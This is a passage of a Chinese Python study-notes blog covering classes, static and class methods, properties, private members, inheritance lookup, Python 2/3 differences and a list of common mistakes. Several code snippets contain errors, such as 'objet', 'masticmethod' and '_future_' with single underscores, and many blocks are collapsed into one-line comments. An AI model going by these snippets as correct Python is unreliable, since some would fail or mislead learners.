</ul>
<p>怎么调用类里面的方法？</p>
<ul>
<li><p>根据类生成对象</p>
</li>
<li><p>通过对象来调用类里面的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params">objet</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">obj = Fun()    <span class="comment">#创建一个对象obj</span></span><br><span class="line">obj.inner()      <span class="comment">#通过对象来调用Fun类里的方法  inner</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="7-1-2-面向对象"><a href="#7-1-2-面向对象" class="headerlink" title="7.1.2 面向对象"></a>7.1.2 面向对象</h4><p>面向对象的三大特征：</p>
<ul>
<li>封装</li>
<li>继承</li>
<li>多态</li>
</ul>
<p>对象的作用：封装数据，方便以后使用这些数据</p>
<p>对象的本质：就是封装内容的</p>
<p>对象的特性：一个类可以生成很多对象，这些对象都是独立的，如果封装数据的话，每个里面封装的数据都可以是不同的，每个对象都可以用类里面的方法</p>
<p>什么时候适合用面向对象？</p>
<ul>
<li>函数比较多需要归类时</li>
<li>需要将数据封装到不同的对象里，方便下次调用时</li>
</ul>
<h4 id="7-1-3-类成员"><a href="#7-1-3-类成员" class="headerlink" title="7.1.3 类成员"></a>7.1.3 类成员</h4><p>分类与使用：</p>
<ul>
<li><p>实例变量（对象变量）：就是通过init初始化函数封装的变量</p>
<p>易错点：在通过对象（实例）来取类变量时，如果实例（对象）里也有同名的变量，那么最终取到的是对象（实例）变量，而不是类变量</p>
</li>
<li><p>类变量</p>
<p>取类变量：</p>
<ul>
<li><p>python中：</p>
<p>通过对象取：优先取对象里的变量，如果对象里没有才去类里取，如果类里没有，就去改类的基类里取</p>
<ul>
<li>前提：对象中没有封装相同的变量，如果封装了相同的变量num，那么最终取到的结果是对象里的变量，而不是类变量</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过对象来取类变量：对象里没有封装同名的变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;欢迎！&#x27;</span>)</span><br><span class="line">obj = Foo()  </span><br><span class="line"><span class="built_in">print</span>(obj.num)  <span class="comment">#通过对象取类变量num，结果为：1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过对象来取类变量：对象里有相同的变量，最终取到的是对象变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,num</span>):</span></span><br><span class="line">        self.num = num</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;欢迎！&#x27;</span>)</span><br><span class="line">obj = Foo(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.num)  <span class="comment">#取到是对象变量，结果为：5</span></span><br></pre></td></tr></table></figure>

<p>通过类来取：如果当前类没有，则去它的基类里取，只能向上，而不能向下（朝对象找）</p>
<ul>
<li><p>格式：    类 +变量名</p>
</li>
<li><p>易错点：只能取类变量，无法取到init里的变量，因为init里是对象变量</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过类来取类变量：只能取到类变量，无法取到对象变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,num</span>):</span></span><br><span class="line">        self.num = num</span><br><span class="line">    num = <span class="number">1</span>   <span class="comment">#取到的是这里，init里封装的是对象变量</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;欢迎！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(Foo.num)  <span class="comment">#取到是类变量，结果为：1</span></span><br></pre></td></tr></table></figure></li>
<li><p>其他语言中：只能通过对象来取变量</p>
</li>
</ul>
</li>
<li><p>绑定方法</p>
<p>特点：参数里必须要有self，默认的都是绑定方法</p>
<p>执行：先实例化一个对象，然后通过    对象  +  方法  +  ()     来进行调用</p>
<p>易错点：仅仅只能通过对象来调用方法，因为绑定方法绑定的就是对象，所以不能脱离对象来调用</p>
</li>
<li><p>静态方法</p>
<p>特点：需要用到一个装饰器，masticmethod</p>
<p>作用：避免不必要的实例化对象，更节约资源，形式上省掉了self</p>
<p>执行：</p>
<ul>
<li>可以通过类来调用方法（推荐）</li>
<li>也可以通过对象来调用方法（不推荐，因为在其他语言中，都仅仅只能通过类来调用方法，而无法通过对象调用方法）</li>
</ul>
<p>易错点：既可以通过类来调用方法，也可以通过对象来调用，推荐使用类来调用静态方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绑定方法：必须要有形参self</span></span><br><span class="line"><span class="comment">#静态方法：不需要形参self</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;这里必须要有self形参，所以它是绑定方法&#x27;</span>)</span><br><span class="line"><span class="meta">    @staticmethod     </span><span class="comment">#通过该装饰器生成静态方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exirse</span>():</span>          <span class="comment">#这里不需要self</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;这里通过装饰器，所以不需要self&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = Fun()</span><br><span class="line">obj.inner()    <span class="comment">#因为inner是绑定方法，只能通过其绑定的对象来调用</span></span><br><span class="line">Fun.exirse()    <span class="comment">#exirse是静态方法，所以可以通过类来调用方法</span></span><br></pre></td></tr></table></figure></li>
<li><p>类方法</p>
<p>特点：需要用到一个装饰器，classmethod</p>
<p>参数：必须要有一个cls形参</p>
<p>作用：传递类的名字到方法中，方便使用</p>
<p>本质：静态方法的用法基本一致，只不过类方法必须要有cls形参，而静态方法没有参数限制，如果要传递类名，则使用类方法</p>
<p>执行：</p>
<ul>
<li>通过类调用方法（推荐）</li>
<li>通过对象调用方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#类方法：传递类名，必须要有形参cls，用到装饰器classmethod</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exirse</span>(<span class="params">cls</span>):</span>          <span class="comment">#必须要有形参cls</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;类名是：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cls))    <span class="comment">#打印外部传递过来的类名</span></span><br><span class="line">obj = Fun</span><br><span class="line"><span class="comment">#不推荐：通过对象调用类方法</span></span><br><span class="line">obj.exirse()    <span class="comment">#传递类名Fun到方法exirse中，结果为：类名是：&lt;class &#x27;__main__.Fun&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#推荐：通过类来调用类方法</span></span><br><span class="line">Fun.exirse()     <span class="comment">#传递类名Fun到方法exirse中，结果为：类名是：&lt;class &#x27;__main__.Fun&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>属性</p>
<p>本质：去掉通过对象调用方法时后面的括号，使代码更简洁美观</p>
<p>特点：需要用到装饰器 property</p>
<p>前提：因为属性只适合通过对象调用的方法，所以被调用的方法的形参里必须要有self，并且有且只能有self这个形参，因为去掉了括号，也就是无法传递实参，所以形参里也只能有self这个形参</p>
<p>易错点：形参必须有且只能有self这唯一一个形参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#属性：去掉通过对象调用方法时后面的括号class Fun(object):    @property        #属性需要用到的装饰器    def exirse(self):          #因为是通过对象调用，所以必须要有self        print(&#x27;属性的作用就是去掉通过对象调用方法时后面的括号&#x27;)obj = Fun()     #必须通过对象调用方法才能去掉括号#去掉了调用方法时的括号obj.exirse    #结果为：属性的作用就是去掉通过对象调用方法时后面的括号</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>修改类里的变量：</p>
<ul>
<li><p>通过对象：</p>
<p>特点：只能修改对象里的变量，无法修改类变量</p>
<p>原因：因为想要修改类变量，首先需要对象变量和类变量不重名，但是在这种情况下，一旦我们通过赋值语句来修改类变量，实际并没有修改，而是在对象里创建了一个和类变量同名的一个变量</p>
<p>易错点：如果当前对象里没有，那么修改语句（赋值语句）就相当于在该对象里创建了一个变量</p>
</li>
<li><p>通过类：</p>
<p>特点：只能修改当前类变量，无法修改基类里的类变量</p>
<p>原因：因为想要修改基类里的变量，首先需要对象变量和类变量不重名（也就是当前类里没有待修改的这个变量），但是在这种情况下，一旦我们通过赋值语句来修改类变量，实际并没有修改，而是在对当前类里创建了一个和基类里的类变量同名的一个变量</p>
<p>易错点：如果当前类里没有，那么修改语句（赋值语句）就相当于在该类里创建了一个变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>(<span class="params"><span class="built_in">object</span></span>):</span>    num = <span class="number">1</span>   <span class="comment">#取到的是这里，init里封装的是对象变量    def echo(self):        print(&#x27;欢迎！&#x27;)obj = Foo()obj.num = 50   #并没有修改类变量，而是在对象里创建了一个变量numprint(obj.num,Foo.num)   #结果为：50    1</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>取变量、修改变量总结：</p>
<ul>
<li>不管是通过类还是对象，对自己的上一级（对象的上一级就是类，类的上一级就是基类）都只能读取变量，而无法修改，这时基于待查找数据在当前类或者对象里没有的情况下。但是如果带查找数据在当前类或者对象里存在，那么就优先查找当前类或者对象</li>
<li>不管通过对象或者类来修改变量，都只能修改当前自己所在的对象或者类，无法修改其上一级</li>
</ul>
<p>小练习：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改类里的变量：在有继承关系的前提下class Fun(object):    x = 1class Foo(Fun):    passobj = Foo()  #实例化一个对象print(obj.x )    #通过对象变量，对象里没有，Foo类里没有，取其基类Fun找，获取到x为1print(Foo.x)     #通过类Foo取变量x，当前没有，去其基类Fun找，获取到x为1obj.x = 10      #修改对象里的变量x，没有，就在对象里创建变量x，x为10print(obj.x )    #结果为：10Foo.x = 20       #修改类Foo的类变量x，没有，则在当前类里创建类变量x，x为20print(Foo.x)    #结果为：20</span></span><br></pre></td></tr></table></figure>







<p>绑定方法、静态方法总结：</p>
<ul>
<li>绑定方法必须要有形参self，而静态方法不需要</li>
<li>绑定方法的执行方式必须通过对象来调用方法；而静态方法既可以通过对象调用，也可以通过类调用，推荐使用类调用</li>
<li>静态方法因为不需要用到对象，所以更节约资源</li>
<li>因为区别就是一个self的有无问题，而self和对象本身有关，所以如果一个方法后续会用到对象封装的数据，那么就用绑定方法；如果后续不需要用到对象封装的数据，那么就退浆使用静态方法。</li>
</ul>
<p>类成员总结</p>
<ul>
<li>类变量</li>
<li>实例变量</li>
<li>绑定方法</li>
<li>静态方法</li>
<li>类方法</li>
<li>属性</li>
</ul>
<p>其中，类变量是和类里面的方法代码区间并列的变量；实例变量是对象里封装的变量；而绑定方法的特点就是带有形参self，并且只能通过对象来调用；静态方法就是相当于去掉了self，既可以通过对象来调用，也可以通过类来调用，类方法和静态方法大致相同，只是静态方法的形参没有限制，而类方法必须要有形参cls，用来传递类名；属性主要是用来去掉通过对象调用方法时后面的那个括号，被调用的方法有且只有一个形参self</p>
<p>推荐：在既能通过类来调用方法，又能通过对象来调用方法的前提下，建议使用类来调用方法</p>
<h4 id="7-1-4-成员修饰符"><a href="#7-1-4-成员修饰符" class="headerlink" title="7.1.4 成员修饰符"></a>7.1.4 成员修饰符</h4><p>共有：</p>
<ul>
<li>特点：所有人都可以访问</li>
</ul>
<p>私有：</p>
<ul>
<li><p>适用范围：适合实例变量、类里的变量、方法</p>
</li>
<li><p>特点：并不是所有人都可以访问，通过类或者对象调用方法或者变量时，提示找不到方法：AttributeError: type object ‘Fun’ has no attribute ‘__inner’</p>
</li>
<li><p>标志： _    ‘+’    _    ‘+’    方法名    </p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#私有方法：通过对象调用方法提示方法不存在class Fun(object):    def __exirse(self):        print(&#x27;私有方法的标志： __方法名&#x27;)obj = Fun()obj.__exirse()#私有方法：通过类调用方法提示方法不存在class Fun(object):    @staticmethod    def __inner():        print(&#x27;私有方法的标志： __方法名&#x27;)Fun.__inner()</span></span><br></pre></td></tr></table></figure>



<p>强制访问私有：</p>
<ul>
<li><p>中转法：通过共有方法来实现访问私有方法。在共有方法里调用私有方法，当我们调用共有方法时，就可以将私有方法成功调用了。</p>
<p>适用范围：同一个类中，当共有方法和私有方法在同一个类中，我们可以在该共有方法中构造调用私有方法的语句来实现访问私有方法，但是如果该公有方法和私有方法不在同一个类中，那么就不是用于中转法。哪怕这两个类的关系是基类和派生类的关系也不行。</p>
<p>易错点：该公有方法和私有方法必须在同一个类中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过共有方法访问私有方法class Fun(object):    def exirse(self):   #共有方法        print(&#x27;私有方法的标志： __方法名&#x27;)        self.__inner()   #共有方法内部调用私有方法，可以正常调用    @staticmethod    def __inner():   #私有方法        print(&#x27;私有方法的标志： __方法名&#x27;)obj = Fun()  obj.exirse()</span></span><br></pre></td></tr></table></figure></li>
<li><p>推荐方法：在调用时，直接在调用语句里加上该方法所在的类名即可</p>
<p>格式 ： 对象._类名__变量名或者方法名</p>
<p>易错点：必须要通过对象才能使用该方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#强制访问私有变量：class Fun(object):    __x = 50    def __inner():   #私有方法        print(&#x27;私有方法的标志： __方法名&#x27;)obj = Fun()#通过   _类名__变量名或者方法   来实现强制访问私有变量或者方法print(obj._Fun__x)   #结果为：50</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="7-2-继承"><a href="#7-2-继承" class="headerlink" title="7.2 继承"></a>7.2 继承</h3><p>基本格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#继承class Fun(object):   #代表累Fun继承object，Fun是派生类(子类)，object是基类（父类）    pass</span></span><br></pre></td></tr></table></figure>

<p>继承的两个类的名称：</p>
<ul>
<li><p>父类和子类</p>
</li>
<li><p>或者基类和派生类</p>
</li>
</ul>
<p>继承在python2和python3中的区别：</p>
<ul>
<li>python2定义类，类名后面的括号里必有object，代表继承object类，这样的类叫做新式类；如果类名后面没有括号，即没有继承object类，那么该类就是经典类（落后的类）</li>
<li>python3定义类，不需要在后面括号里写object，因为python3默认继承object类，所以python3中所有的类都是新式类（推荐）</li>
</ul>
<p>面向对象中继承的意义：</p>
<ul>
<li>当多个类有共同的方法A时，我们不可能在每个类中都写上该方法A，毕竟如果类的数量多，比如几百上千个，那么这样就很费资源，所以继承的意义就体现出来了，多个类继承同一个基类，那么只需要基类中有该方法A，那么其下面的所有派生类都可以使用该方法A</li>
</ul>
<p>在继承关系中，怎么查找方法？</p>
<ul>
<li><p>核心原则：优先在当前类中找，如果当前类没有，就去基类找</p>
</li>
<li><p>根本原则：</p>
<p>判断对象self到底是谁？        self会传递，但是要把握它的根本</p>
<p>对象由谁创建的?        谁创建的，就优先从创建它的类开始找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#继承示例一：class Fun(object):   #代表累Fun继承object    def inner(self):        print(&#x27;666&#x27;)class Fun1(Fun):   #继承Fun类    def inner(self):        print(111)    def ceshi(self):        print(&#x27;狗屎&#x27;)obj = Fun1()   #创建了一个对象#这里obj由Fun1创建，所以优先在创建它的类开始找obj.inner()    #结果为：111obj.ceshi()    #结果为：狗屎#继承：示例二：class father(object):    def ceshi(self):        print(&#x27;你好&#x27;)class Fun(father):   #代表累Fun继承object    def inner(self):                #Fun1里没有inner，所以找到了这里，但是这里的self实际上是obj，所以self.ceshi()优先取创建self也就是obj的类里去找        self.ceshi()    def ceshi(self):        print(&#x27;张三是傻逼&#x27;)class Fun1(Fun):   #继承Fun类    def ceshi(self):                     print(&#x27;狗屎&#x27;)obj = Fun1()   #创建了一个对象obj.inner()    #结果为：狗屎&#x27;&#x27;&#x27;1、Fun1里没有inner方法，所以去它的基类Fun里去找2、找到了，执行inner，但是inner又调用方法ceshi，但是ceshi在好几个类里都有3、判断inner里的self到底是谁？由谁创建？这里self实际是obj，由Fun1创建，所以找ceshi方法从类Fun1开始找4、找到了，执行测试，结果为    狗屎&#x27;&#x27;&#x27;#继承：示例三：class Base1:    def f1(self):        print(&#x27;base1.f1&#x27;)    def f2(self):        print(&#x27;base1.f2&#x27;)    def f3(self):        print(&#x27;base1.f3&#x27;)        self.f1()class Base2:    def f1(self):        print(&#x27;base2.f1&#x27;)class Foo(Base1, Base2):    def f0(self):        print(&#x27;foo.f0&#x27;)        self.f3()obj = Foo()    #对象由Foo创建obj.f0()&#x27;&#x27;&#x27;1、obj由Foo类创建2、查找F0，打印foo.f03、查找f3，但是Foo中没有，所以去它的父类，   但是这里有两个父类，所以先去左边的父类Base1找4、找到f3，打印 base1.f3  ，并且查找f15、由于这里的self本质上就是obj，obj由Foo创建，所以先从Foo找f16、Foo里没有f1，所以去它的左边的父类Base1找7、找到f1，打印base1.f1所以最终结果为：foo.f0base1.f3 base1.f1&#x27;&#x27;&#x27;#继承：示例四：class Base:    def f1(self):        print(&#x27;base.f1&#x27;)    def f3(self):        self.f1()        print(&#x27;base.f3&#x27;)class Foo(Base):    def f1(self):        print(&#x27;foo.f1&#x27;)    def f2(self):        print(&#x27;foo.f2&#x27;)        self.f3()obj = Foo()  #实例化一个对象obj.f2()&#x27;&#x27;&#x27;1、obj由Foo创建，去Foo里找f2，找到，打印foo.f2   ，并查找f32、Foo里没有f3，去它的基类Base找3、找到f3，接着查找f1，此时需要判断，self到底是谁？由谁创建4、结合实际，这里self是obj，由Foo创建，所以来Foo查找f15、找到f1，打印foo.f16、执行完毕，回到f3中接着往下执行，打印base.f3所以最终结果为：foo.f2 foo.f1base.f3&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>继承多个类怎么找方法？</p>
<ul>
<li><p>先从当前类开始找，如果没有，就去括号里的最左边的基类A里找，如果A里也没有，就去B里找，依次往下找下去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params">A,B</span>):</span>   <span class="comment">#Fun里没有就去A里找，A里没有就去B里找    pass</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="7-3-多态"><a href="#7-3-多态" class="headerlink" title="7.3 多态"></a>7.3 多态</h3><p>别名：鸭子模型</p>
<ul>
<li>一个鸭场，接收别人送过来的所有种类的鸭子，但是在喂养的时候，鸭场负责人并不是所有鸭子都喂食，只有那种会呱呱叫的鸭子才给他们喂食物，这就是一种多态</li>
</ul>
<p>特点：</p>
<ul>
<li>接收多种数据类型</li>
<li>但是是有满足某个特定的方法才会有效（呱呱叫）</li>
</ul>
<h2 id="第八章-网络编程"><a href="#第八章-网络编程" class="headerlink" title="第八章 网络编程"></a>第八章 网络编程</h2><h2 id="第九章-并发编程"><a href="#第九章-并发编程" class="headerlink" title="第九章 并发编程"></a>第九章 并发编程</h2><h2 id="第十章-数据库"><a href="#第十章-数据库" class="headerlink" title="第十章 数据库"></a>第十章 数据库</h2><h2 id="第十一章-前端开发"><a href="#第十一章-前端开发" class="headerlink" title="第十一章 前端开发"></a>第十一章 前端开发</h2><h2 id="第十二章-Django框架"><a href="#第十二章-Django框架" class="headerlink" title="第十二章 Django框架"></a>第十二章 Django框架</h2><h2 id="附录1-python2和python3区别"><a href="#附录1-python2和python3区别" class="headerlink" title="附录1 python2和python3区别"></a>附录1 python2和python3区别</h2><h3 id="1-1-1-默认编码"><a href="#1-1-1-默认编码" class="headerlink" title="1.1.1 默认编码"></a>1.1.1 默认编码</h3><ul>
<li><p>py2：</p>
<p>ascii编码</p>
</li>
<li><p>py3：</p>
<p>unicode编码</p>
</li>
<li><p>解决办法：添加文件头</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-1-2-整型和除法"><a href="#1-1-2-整型和除法" class="headerlink" title="1.1.2 整型和除法"></a>1.1.2 整型和除法</h3><ul>
<li><p>整型</p>
<ul>
<li><p>py2：</p>
<p>int,long</p>
</li>
<li><p>py3:</p>
<p>int</p>
</li>
</ul>
</li>
<li><p>除法</p>
<ul>
<li><p>py2：</p>
<p>除法不保留小数位，例如5/2=2</p>
</li>
<li><p>py3：</p>
<p>除法后的结果有小数位，5/2=2.5</p>
</li>
<li><p>解决办法</p>
<p>在py2脚本文件里导入py3的除法模块即可,除法的英文单词是（division）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> _future_ <span class="keyword">import</span> division</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="1-1-3-输入和输入"><a href="#1-1-3-输入和输入" class="headerlink" title="1.1.3 输入和输入"></a>1.1.3 输入和输入</h3><p>输入：</p>
<ul>
<li><p>py2:</p>
<ul>
<li>raw_input()</li>
</ul>
</li>
<li><p>py3:</p>
<ul>
<li>input()</li>
</ul>
</li>
</ul>
<p>输出：</p>
<ul>
<li><p>py2:</p>
<ul>
<li>print ‘’</li>
</ul>
</li>
<li><p>py3:</p>
<ul>
<li>print(‘’)</li>
</ul>
</li>
</ul>
<h3 id="1-1-4-迭代器"><a href="#1-1-4-迭代器" class="headerlink" title="1.1.4  迭代器"></a>1.1.4  迭代器</h3><p>字典的values,keys,items：</p>
<ul>
<li><p>py2:</p>
<p>values(),keys(),items()：直接生成数据，开始占用内存，不需要配合for</p>
</li>
<li><p>py3:</p>
<p>values(),keys(),items()：生成的是一个迭代器，必须要配合for才能取出里面的数据</p>
</li>
</ul>
<p> filter,map函数</p>
<ul>
<li><p>py2:</p>
<p>直接生成数据，立刻开始占用内存，不需要配合for</p>
</li>
<li><p>py3:</p>
<p>生成的是一个迭代器，必须要配合for才能取出里面的数据</p>
</li>
</ul>
<h3 id="1-1-5-最大的区别：str-unicode"><a href="#1-1-5-最大的区别：str-unicode" class="headerlink" title="1.1.5 最大的区别：str,unicode"></a>1.1.5 最大的区别：str,unicode</h3><p>python2:</p>
<ul>
<li><p>有str类型，unicode数据类型，这里的str相当于就是python3中的字节类型bytes，这里的unicode类型就是相当于py3中的str类型（都是unicode编码）</p>
<p>易错点：这里的unicode是一个数据类型</p>
</li>
</ul>
<p>python3:</p>
<ul>
<li>有str类型，bytes类型，py3中，str类型是unicode编码（一般用于内存中），bytes是非unicode编码的其他编码后的数据类型（以b开头，一般用于数据传输、存储）</li>
</ul>
<h3 id="1-1-6-类的区别"><a href="#1-1-6-类的区别" class="headerlink" title="1.1.6 类的区别"></a>1.1.6 类的区别</h3><p>python2：</p>
<ul>
<li>定义类时，类名后面的括号里必须要写上object，代表继承object类，同时该类被称为新式类；如果定义类，类名后面没有括号，那么这种类就是经典类（落后的类）</li>
</ul>
<p>python3：</p>
<ul>
<li>类名后面的括号里不强制必须写object，可写可不写，因为python3中，默认继承object类，所以可以不写，所以python3中所有的类都是新式类（推荐）</li>
</ul>
<p>推荐：推荐新式类，同时推荐每次定义类时，括号里都写上object，这样即使在python2中运行代码也不会出错</p>
<h2 id="附录2-python错题"><a href="#附录2-python错题" class="headerlink" title="附录2 python错题"></a>附录2 python错题</h2><h3 id="1-git上传码云，提示无权限"><a href="#1-git上传码云，提示无权限" class="headerlink" title="1.git上传码云，提示无权限"></a>1.git上传码云，提示无权限</h3><p>第一步：在git终端上生成sshkey</p>
<ul>
<li><p>如果之前生成过，再输入该命令会提示是否覆盖，此时需要输入y才能覆盖，如果不输入，则不覆盖：ssh-keygen -t rsa -C “<a href="mailto:&#55;&#x34;&#48;&#x33;&#49;&#48;&#51;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#x6e;&#95;&#114;&#111;&#97;&#x64;&#x40;&#x75;&#115;&#101;&#114;&#46;&#110;&#111;&#114;&#x65;&#x70;&#x6c;&#x79;&#46;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#55;&#x34;&#48;&#x33;&#49;&#48;&#51;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#x6e;&#95;&#114;&#111;&#97;&#x64;&#x40;&#x75;&#115;&#101;&#114;&#46;&#110;&#111;&#114;&#x65;&#x70;&#x6c;&#x79;&#46;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>“</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191502617.png" alt="image-20200403191502617"></p>
</li>
<li><p>查看生成的ssh秘钥：cat ~/.ssh/id_rsa.pub</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191529751.png" alt="image-20200403191529751"></p>
</li>
</ul>
<p>第二步：在码云个人设置里—ssh公钥—新增公钥—-名称建议输入和项目名，公钥输入刚才复制的</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191817999.png" alt="image-20200403191817999"></p>
<p>第三步：回到git终端输入： ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#101;&#x65;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#101;&#x65;&#46;&#x63;&#111;&#109;</a>  显示下图界面就代表成功了</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191921263.png" alt="image-20200403191921263"></li>
</ul>
<h3 id="2-为特定脚本更改解释器发现只有一个解释器"><a href="#2-为特定脚本更改解释器发现只有一个解释器" class="headerlink" title="2 .为特定脚本更改解释器发现只有一个解释器"></a>2 .为特定脚本更改解释器发现只有一个解释器</h3><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403200637099.png" alt="image-20200403200637099"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403200709234.png" alt="image-20200403200709234"></p>
<ul>
<li><p>解决方法</p>
<ul>
<li><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403200709234.png" alt="image-20200403200709234"></p>
</li>
<li><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403200816527.png" alt="image-20200403200816527"></p>
</li>
</ul>
</li>
</ul>
<h3 id="3-使用-格式化"><a href="#3-使用-格式化" class="headerlink" title="3.使用%格式化"></a>3.使用%格式化</h3><ul>
<li><p>格式化‘%’这个字符需要使用两个%，即 %%</p>
</li>
<li><p>易错点：</p>
<p>用%接收参数时，必须要用逗号进行结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">guess = <span class="string">&#x27;今天有50%%的可能%s&#x27;</span><span class="built_in">print</span>(guess%(<span class="string">&#x27;下雨&#x27;</span>,) )   <span class="comment">#逗号一定不能少</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-pycharm中选择Run-File-in-python-control后怎么恢复？"><a href="#4-pycharm中选择Run-File-in-python-control后怎么恢复？" class="headerlink" title="4.pycharm中选择Run File in python control后怎么恢复？"></a>4.pycharm中选择Run File in python control后怎么恢复？</h3><ul>
<li><p>顶部工具栏Run—Run alt  + shift + F10 —Edit Configuration — 取消勾选</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404123518615.png" alt="image-20200404123518615"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404123535289.png" alt="image-20200404123535289"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404123609468.png" alt="image-20200404123609468"></p>
</li>
</ul>
<h3 id="5-利用步长实现倒着打印"><a href="#5-利用步长实现倒着打印" class="headerlink" title="5.利用步长实现倒着打印"></a>5.利用步长实现倒着打印</h3><ul>
<li><p>如果步长为负数，则切片就是从最后一个元素往第一个元素切片，如果没写步长，则默认是1</p>
</li>
<li><p>易错点：</p>
<ul>
<li><p>步长忘记写了，必须要写成负数</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404132308361.png" alt="image-20200404132308361"></p>
</li>
</ul>
</li>
</ul>
